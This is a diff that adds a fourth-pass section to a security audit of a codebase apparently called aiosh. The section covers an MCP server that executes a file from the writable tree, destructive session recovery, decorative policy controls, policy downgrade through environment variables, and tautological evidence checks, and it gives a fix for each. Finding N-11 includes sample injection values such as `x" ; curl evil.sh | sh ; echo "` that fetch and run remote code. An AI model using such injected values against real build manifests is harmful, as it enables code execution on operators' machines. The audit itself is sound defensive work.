@@ -491,3 +491,302 @@ temp-file paths, `handoff_service.rs` persistence, `pep.rs` check body, `tools/*
 `code/aiosh-cli/src/{constitution,pentest,types}.ts`, and the Python `tools/ci_service.py` report layer.
 
 ---
+
+# FOURTH PASS — 2026-09-20 (policy verdicts, recovery paths, verification tools, agent loop)
+
+This pass read the surfaces the first three passes explicitly left unread. Every finding below is new;
+where something already recorded (C-1..C-7, H-*, M-*, N-1..N-6) applies, it is cited by ID instead of
+restated. Two of the modules the mission named (`kernel_module*`, `package_policy`) were already read
+line-by-line in pass 2/3 and yielded nothing beyond what is recorded — that is stated in the coverage
+section rather than padded here.
+
+## New: HIGH
+
+### N-7 — Write-to-execute: the MCP imports `tools/task_ledger.py` from the writable working tree
+
+`code/aiosh-mcp/aiosh_mcp/server.py:479-491` (`_load_task_ledger`) resolves
+`Path(__file__).resolve().parents[3] / "tools" / "task_ledger.py"` — i.e. `<repo>/tools/task_ledger.py`
+— and runs `spec.loader.exec_module(mod)` **inside the MCP server process**, caching the module globally.
+There is no hash pin, no signature, no root confinement, and no check that the file is even the one the
+package shipped.
+
+The MCP process is the authorization boundary (classifier → PEP → audit). Code executed there can mint
+grants (N-4), write or rewrite audit rows (`audit_client.write_audit_row`), and satisfy any gate, so this
+converts every file-write finding in this report into code execution *as the gate itself*:
+
+* H-9 / N-1 — `store_path` is a free-form MCP argument; the store writers `create_dir_all` + rename there.
+* H-10 — the Python release/backup writers (arbitrary text, caller-chosen path).
+* N-3 — `aiosh kernel-module export --modprobe <path>` writes attacker-derived text with `std::fs::write`.
+* M-8 class — a checked-out branch is trusted code: `git checkout` of a malicious `tools/task_ledger.py`
+  is RCE by itself, with no exploit needed.
+
+Honest scope: the JSON store writers emit typed JSON, and JSON containing `true`/`false`/`null` is not a
+valid Python program (those are `NameError`s), so the shortest *reliable* path is a text-capable writer
+(release/export) or a malicious tree. The design defect is the same either way: the gate executes a file
+that the tools it guards can write.
+
+**Fix.** Import the ledger module normally from the installed package (or vendor it into `aiosh_mcp`),
+never `exec_module` a path under the writable tree; if a side-loaded module is a requirement, require an
+allowlisted root outside the workspace and record its sha256 in the audit row of the call that used it.
+
+## New: MEDIUM
+
+### N-8 — `aios.session.check` + `auto_recover` overwrites the session store and seeds a synthetic session
+
+`session_recovery.rs:269-303` `recover_session_store_with_backup` backs the file up with `fs::copy` and
+then **writes a fresh store over the live path** (`fresh_store.save_to_path(path)`) — the module header
+(`session_recovery.rs:3-4`) advertises "automated non-destructive self-healing". The "fresh" store is
+`UserSessionService::new()` (`session_service.rs:62-95`), which **seeds `greeter-seat0`**: username
+`lightdm`, uid 62000, state `Active`, scope `Foreground`, `leader_pid: Some(1001)`. Recovery therefore
+*injects* a synthetic foreground login session into the state the subsystem subsequently reports.
+
+Trigger (no grant required — all `aios.session.*` tools pass `require_grant=false`):
+`aios.session.check` with `{"auto_recover": true}` (`aiosh-mcp/src/main.rs:3210-3232`) or the CLI's
+`session check --recover` (`aiosh-cli/src/main.rs:3363`). The health gate is
+`validate_session_store` (`session_recovery.rs:113-238`), which flags cross-record inconsistencies the
+data layer happily accepts: `specs.len() != sessions.len()`, a spec/status `username` or `uid` mismatch,
+two non-terminated sessions sharing one `leader_pid`, or two `Foreground` sessions on one seat. One such
+inconsistency (trivially injectable with the write primitives above) replaces the entire store.
+
+Impact: total, silent session-store loss on a merely inconsistent file — the `.bak` exists, but the tool
+reports the *recovered* store as healthy and the caller persists it — plus a phantom active `lightdm`
+session on seat0 presented as real. A tool named "check" is the destructive one.
+
+**Fix.** Split `check` from `repair`; put `repair` behind a grant; make repair non-destructive (move the
+bad file aside and start empty without seeding synthetic sessions); emit an audit row for the repair
+(`distro_recovery.rs:101` has the same silent-rename pattern already recorded as informational).
+
+### N-9 — Session policy "Audit" mode enforces nothing *and records nothing*; three advertised controls are absent
+
+* `session_service.rs:128-138`: the policy is consulted **only** when
+  `self.policy.mode == SessionPolicyMode::Enforcing`. In `Audit`/`Permissive` no verdict is computed at
+  all, and `UserSessionActionReport` (`session_service.rs:17-32`) has no field that could carry
+  violations — so the violations are neither returned nor logged. The mode whose name promises
+  "log-only" is in fact "neither enforce nor log". The module's own tests
+  (`session_policy.rs:530-548`) assert that violations *exist* in Audit mode: the policy object can
+  produce them; the service never asks.
+* No core strips the loader environment variables. `validate_user_session_spec`
+  (`session.rs:396-600`) accepts `LD_PRELOAD` as a well-formed key (uppercase + `_`, value without
+  `\0`), so an Audit-mode `create_session` stores it in `spec.environment` (`session.rs:86`) and it stays
+  there. A repo-wide search for any removal/normalization finds none. Yet `session_policy.rs:3-5`
+  advertises "dynamic linker environment variable stripping" — only detection is implemented, and only
+  under Enforcing.
+* `require_agent_sandboxed` (`session_policy.rs:52`, honoured at `:288-300`) is a dead control: its only
+  effect is refusing `uid < 1000` for agent sessions, and `UserSessionSpec` has no sandbox field of any
+  kind, so the policy cannot observe whether an agent session is sandboxed. The flag cannot do what its
+  name claims.
+
+**Fix.** Evaluate the policy in every mode and persist the verdict (returned *and* audited); sanitize
+`spec.environment` on write rather than only detecting on read; either implement sandbox attestation
+(a field the launcher sets) or rename the flag to what it checks.
+
+### N-10 — The distro subsystem's security controls are decorative
+
+* `distro_policy.rs:15,17` declare `require_https_repositories` and `require_signed_packages`, default
+them to `true` (`:27-28`), and **never read them anywhere** (repo-wide: those two identifiers appear only
+in that file). `check_profile` (`:103-140`) evaluates P1 (security score), P2 (binary compatibility) and
+P5 (disallowed family) only, and `DistroProfile` (`distro.rs:44-57`) has no repository field at all — so
+P3/P4 are unenforceable as written. A profile with http-only, unsigned repositories is "compliant" by
+construction.
+* The score those thresholds gate is a **constant chosen by the profile author**:
+`DistroEvaluation::evaluate` (`distro.rs:198-217`) maps `Kali => 0.98`, `Debian => 0.95`,
+`Alpine => 0.85`, i.e. `min_security_score` compares a hardcoded family table, not any measurement.
+* `DistroConfig` validates `weights.*` (NaN / negative / positive-total, `distro_config.rs:122-137`) and
+`min_recommendation_score` (`:116-121`), and reports both via `to_json_with_sources` (`:159-170`) — while
+`evaluate()` hardcodes 0.4/0.3/0.3 and `is_production_ready = overall >= 0.75 && binary_compat >= 0.8`.
+Neither value is consumed anywhere (grep confirms no reads outside the config module).
+
+Impact: `aios.distro.policy` and `aios.distro.recommend` emit verdicts that *look* evidence-based and are
+family constants; tuning the documented knobs changes no output. This is the M-2 / H-7 dead-knob class,
+but here it is the policy surface itself that is a facade.
+
+**Fix.** Add a `repositories` list to the profile and wire the two booleans, or delete them; pass
+`DistroConfig.weights`/`min_recommendation_score` into `evaluate`; treat profile-declared scores as
+untrusted input to the policy rather than as the policy's evidence.
+
+### N-11 — The base-image build plan is a command-injection carrier into an operator-facing artifact
+
+`base_image_service.rs:118-190` interpolates manifest fields straight into shell templates:
+`debootstrap --arch={architecture} … --include={packages}` (`:140-150`),
+`chroot /target {initramfs_generator} --kver {version} --cmdline "{cmdline}"` (`:152-157`), and the
+`distro_id`-selected fallback (`:149`). `validate_base_image_manifest` (`base_image.rs:214-258`) checks
+id, SemVer, package charset, hostname, filesystem, size budget, `artifact_sha256`, and a 4096-byte cmdline
+with no `\0\r\n` — and validates **none of** `rootfs.architecture`, `rootfs.distro_id`, `kernel.version`,
+or `kernel.initramfs_generator`. The cmdline is screened only for `\0\r\n` and then placed *inside double
+quotes*, so `"`, backticks and `$( )` survive: `cmdline = 'x" ; curl evil.sh | sh ; echo "'` escapes the
+quoting, and `architecture = "x86_64;curl evil|sh"` injects into the bootstrap stage.
+
+Sink today: `aiosh-cli/src/main.rs:722` **prints** `stage.command_template` (the plan JSON returns it too).
+No in-tree shell executor exists (verified: no `sh -c`/`Command::new("sh")` in Rust, no `shell=True` in
+Python/TS), so this is a stored injection into an artifact an operator copies — Medium for exactly that
+reason, and cheap to fix. Note also that `register_image` (`:76-83`) runs only `manifest.validate()`; the
+policy that *would* flag a bogus architecture as `P5_ARCHITECTURE_WHITELIST` fatal in Enforcing mode is
+not consulted at registration or at plan time.
+
+**Fix.** Evaluate `BaseImageSecurityPolicy` in Enforcing mode inside `generate_build_plan` before
+rendering; replace the single command string with an argv-shaped stage descriptor (`program` + `args[]`)
+so nothing is quoted into a shell; add the missing field validations to the data model.
+
+### N-12 — There is no single "active policy": policy tools evaluate something else, and the server environment is an unauthenticated policy input
+
+Resolution differs *inside one binary*: `aios.image.policy` calls `BaseImageSecurityPolicy::from_env()`
+(`aiosh-mcp/src/main.rs:1901`) — so `AIOSH_BASE_IMAGE_POLICY_MODE=permissive|audit` in the server's
+environment turns every verdict into `allowed` (`base_image_policy.rs:243-250, 313-317`; env parsing
+`:160-210`). `aios.session.policy` (`main.rs:3129-3146`) instead uses `from_file(policy_path)` or the
+compiled default and ignores the environment entirely (`session_policy.rs:441-470` reads quota knobs
+only). `aios.package.policy` / `service.policy` / `kernel_module.*` use caller path → env → default
+(N-2).
+
+Two consequences: (1) *false assurance* — a green `aios.*.policy` report is evidence about that tool's
+own resolution, not about what any enforcing path uses; there is no "policy in force" object and no
+revision id in the verdict (unlike the classifier's `policy_revision`), so a reviewer cannot tell which
+policy produced a PASS. (2) *unauthenticated downgrade* — the env route is inherited across the whole
+chain: `agent.ts:130-137` spawns the bridge with `{...process.env}`, `agent_bridge.py:96-104` copies
+`os.environ` into the MCP server parameters, and the Rust MCP inherits its launcher's environment. Setting
+one variable in a shell/CI environment (or a sourced `.env`) downgrades enforcement in the child, and no
+audit row records that a downgrade happened.
+
+**Fix.** Load one policy set once at server start, freeze it, publish its hash/revision in every verdict
+and audit row; require a grant to change a mode and emit a `policy.mode` audit row when it changes; stop
+passing the whole environment to child processes (allowlist).
+
+### N-13 — `tools/check_evidence.py` E3/E4 cannot fail (false-assurance release check)
+
+* `check_e4_hash_consistency` (`tools/check_evidence.py:87-97`) computes SHA-256 of the first ten files
+and asserts `len(digest) == 64` — a tautology. Nothing stores or compares an expected digest, so evidence
+tampering is undetectable by design and the check passes for any content.
+* `check_e3_file_bounds` (`:70-84`) reads `f.read(1024)` and then reports "all N files bounded and valid
+UTF-8"; 1 KiB cannot validate a 16 MiB file's encoding. The size checks (`stat`) are real.
+* `check_e2_ledger_consistency` (`:44-60`) samples only `completed[-50:]` while its docstring claims
+"completed tasks in TASK_STATE.json have evidence"; older completions are never checked and the sampling
+is not surfaced in the PASS line.
+
+Impact: this is the checker named in the evidence/completion pipeline, and it prints
+`PASS: evidence integrity criteria (E1..E4)` while being structurally unable to detect modification of an
+evidence file. Together with H-11 (the Rust verifier comparing against hashes inside the manifest it is
+handed), "evidence verified" claims in this repository currently rest on nothing.
+
+**Fix.** Store and compare digests; decode the whole file with a streaming/incremental UTF-8 decoder;
+check all completions or print the sampling limitation in the verdict line.
+
+## New: LOW
+
+### N-14 — Needle-based ledger lookup can bind the wrong task record
+
+`tools/task_ledger.py:337-345` `find_task_in_ledger` scans each line for the literal substring
+`'"id": {task_id},'` / `'"id":{task_id},'` and returns the first line that parses — a match can occur
+*inside another task's text* (a title, acceptance item or note containing that substring). `complete_task`
+(`:472-500`) then uses the matched record for `task.get("title")` and, in `_ensure_evidence_stub`
+(`:452-470`), for `task.get("acceptance", [])`, so a crafted ledger line can make a completion's evidence
+stub attest a *different* task's acceptance criteria. The no-skip check (`:476-480`) still guards *which*
+task may be completed, so this is an attestation-integrity bug, not a skip bypass.
+Secondary: `_ensure_evidence_stub` writes with `open(path, "w")` — the only non-atomic write in the
+mutation path (ordering is correct: the event and state are fsynced first).
+
+**Fix.** Parse each line and compare `rec.get("id") == task_id` (the ledger is bounded, and `read_events`
+already demonstrates the parse-based approach); write the stub via `os.open(O_EXCL)` + `os.replace`.
+
+### N-15 — Audit provenance is caller-asserted at the Python commit boundary
+
+`_dispatch.commit()` (`code/aiosh-mcp/aiosh_mcp/_dispatch.py:196-247`) accepts `policy_revision`,
+`classify_rule_ids`, `classify_evidence`, `classify_overall_verdict` and `classify_verdict_reason` as
+**parameters**; it re-classifies only when one of them is `None` (`:216-231`), and any supplied value is
+persisted verbatim as "which rule decided this call" — the ADR-0035 §D-4 invariant its docstring claims.
+`c_flags` are then recomputed by a *separate* classification call (`:232`), so a row's C-flags and its
+recorded rule ids can come from two different evaluations, and nothing reconciles either with what
+`dispatch()` actually decided (`:172-190`) — nor does anything prevent a caller from invoking `commit()`
+without ever calling `dispatch()`.
+
+Today's internal callers (`server.py:58-112` `_recorded_call`, `pentest.py`, `retention.py`,
+`release.py`) pass the fields correctly, so this is latent forgeability rather than an active bypass —
+but it is the same shape that produced C-6 on the Rust side (a hand-rolled audit row) and C-7 (`emit()`
+accepting a caller's grant string).
+
+**Fix.** Have `dispatch()` return an opaque provenance handle (or the row builder itself) and require
+`commit(handle, …)`, re-deriving the classifier fields from the handle instead of accepting them as
+arguments.
+
+## Same class as an existing finding, new location (not counted as new)
+
+* `repo_health_service.rs:60-84` `scan_directory_file_sizes` recurses with `path.is_dir()` (symlinks
+followed) and skips only four hardcoded directory names — no visited set, no depth cap → stack overflow on
+a symlink loop. Same class as H-7 (secrets scanner), new location; one shared hardened walker fixes both.
+* Config writers with caller-controlled destinations: `base_image_config.rs:139-151` (mode 0644),
+`distro_config.rs:174-188`, `handoff_config.rs:87`, `triage_config.rs:95` — `create_dir_all(parent)` +
+write to an unvalidated path. Same class as H-9/N-1, new locations (configuration rather than stores).
+* `RepoHealthConfig::from_env` (`repo_health_config.rs:82-91`) swallows a malformed/invalid config and
+falls back to defaults (`reconcile_repo_health`, `repo_health_service.rs:262-268`, uses
+`unwrap_or_else(default)`), so a typo'd limit silently reverts to the built-in value — the same fail-open
+shape as N-2, different mechanism.
+* `base_image_policy.rs:313-317` hardcodes `fatal: true` on P0 while returning `allowed: true` in Audit
+mode, whereas the sibling rules set `fatal` from the mode (`:262, 272, 282, 292, 302`) and
+`session_service.rs:133` makes decisions by scanning for `fatal`. A verdict carrying a fatal violation
+*and* `allowed: true` means two different things depending on which field the consumer reads —
+informational today, a bypass waiting for a refactor. Standardize: either `fatal` is derived from the mode
+or consumers read `.allowed` only.
+
+## Verified clean this pass
+
+* **`code/aiosh-cli/src/audit.ts` + `retention.ts` are the strongest artefacts in the repository.**
+`verify()` walks the live chain and re-derives every hash from the canonical proto; `rotate()` verifies the
+chain before touching anything, refuses to overwrite an existing segment, writes the archive with
+`{mode: 0o600, flag: "wx"}`, renames for durability, sha256s it, and wraps segment-row + delete +
+rotation-row in one transaction with archive unlink on failure; `verifyFull()` validates archive sha256,
+genesis linkage, line count, first-row id and the head hash before advancing; `seen()` can do an exact
+scan. (Anchoring limits are H-8 and were already recorded.)
+* **`tools/ci_service.py` is a genuinely strict validator**: schema version pinned and compared
+(`:60-63`), arithmetic coherence (`:66-68`), `index == SUITE_NAMES.index(suite)` and monotonic ordering
+(`:80-88`), `all_pass` cross-checked against the registry size (`:69-75`), per-row timestamp shapes, and
+"refusing best-effort parse" on an unknown schema. Nothing to fix beyond a duplicated `human_report()`
+call in `show`.
+* **`tools/task_ledger.py` evidence handling is hardened** (`:255-283`): absolute and `..`-containing paths
+are classified suspicious and never satisfied, existence checks read nothing, and orphans are reported.
+The locking, atomic state writes (`O_EXCL`, 0644, fsync, `os.replace`) and the event-log replay are sound
+on Unix (the Windows lock is M-5, already recorded).
+* **`code/aiosh-cli/src/agent.ts` is clean.** A hard 9-tool allowlist (`:96-99`) plus `normalizePlan`
+(`:336-372`) rejecting unknown tools and non-object inputs; the local classifier is explicitly a preflight
+("never performs the action"); every call writes exactly one audit row or attaches the server's
+`audit_id`; observations are truncated (2 KiB) before re-entering the model context; `max_steps` bounds the
+loop and an all-refused step aborts it. The only applicable issue is the M-8 class — `spawn("python3",
+["-m", "aiosh_mcp.agent_bridge"])` with `PYTHONPATH=MCP_ROOT` and inherited `env` — already recorded.
+* **`aiosh-core/src/session.rs` validators are strong** and should be the template for the rest: session
+ID charset + `..` refusal, username grammar, seat prefix and length, VTNR range with a TTY requirement,
+EnvKey charset and value caps, `XDG_RUNTIME_DIR` absolute + no `..`, `remote_host` anti-argument-injection
+(`starts_with('-')`) and anti-metacharacter checks with an RFC 1123/IP fallback, duplicate `leader_pid`
+detection on load, and exclusive temp-file writes at 0600 (`:397-460`).
+* **`tools/check_evidence.py` reads only what it says** — no traversal, no writes, stdlib-only (the
+weakness in N-13 is *strength* of verification, not unsafe behavior).
+
+## Coverage note for this pass
+
+Read line-by-line (production code; the `#[cfg(test)]` bodies of the pre-verified modules were skimmed,
+not re-derived): `session.rs`, `session_policy.rs`, `session_config.rs`, `session_service.rs`,
+`session_recovery.rs`; `distro.rs`, `distro_policy.rs`, `distro_config.rs`, `distro_service.rs`;
+`base_image.rs`, `base_image_policy.rs`, `base_image_config.rs`, `base_image_service.rs`;
+`repo_health.rs`, `repo_health_config.rs`, `repo_health_service.rs`; plus re-reads of the previously
+covered `kernel_module.rs`/`kernel_module_policy.rs`/`kernel_module_service.rs`/`package_policy.rs`
+(no new findings). Python: `aiosh_mcp/_dispatch.py`, `release_config.py`, `server.py` (both entry-point
+regions and the whole `aios_task`/`_task_metrics` path), `agent_bridge.py` (re-read); `tools/task_ledger.py`,
+`check_evidence.py`, `ci_service.py`, `ci_run.py` (re-read). TypeScript: `audit.ts`, `retention.ts`,
+`agent.ts` (all 584 lines).
+
+Still not read line-by-line (next pass should start here, in this order):
+1. `aiosh-core/src/{distro_recovery, base_image_recovery, distro_observability, base_image_observability,
+   session_observability, kernel_module_observability, kernel_module_recovery}.rs` — the recovery and
+   telemetry bodies, where N-8's pattern likely repeats.
+2. `aiosh-core/src/{doc_index*, evidence*, secrets*, ci*, toolchain*, service_policy, service_config,
+   service_recovery, repo_health tests}.rs` — only pattern-screened so far (`evidence*`/`secrets*` have
+   recorded findings; `doc_index*`/`ci*`/`toolchain*` are untouched beyond greps).
+3. Python `aiosh_mcp/{retention, release, classifier, audit_client, sandbox}.py` — previously read
+   closely in pass 2; *not* re-read this pass (their recorded findings were relied on, not re-verified).
+   A targeted re-read is warranted for `retention.py`'s rotate/rollback path against the TS implementation.
+4. `code/aiosh-cli/src/{constitution, pentest, types}.ts` and the `cli.ts` run/agent command bodies (the
+   *shipped* `dist/` copies were verified consistent with `src/` in pass 3; the source run path itself was
+   last read in pass 2).
+5. `tools/{generate_master_tasks, check_task_docs, ci_suites, doc_index, task evidence generators}.py` —
+   generators and CI scaffolding, lower expected yield.
+6. `AIOS-model/*.py` and `scratch/` — outside the security boundary but never read.
+
+---
+
+---
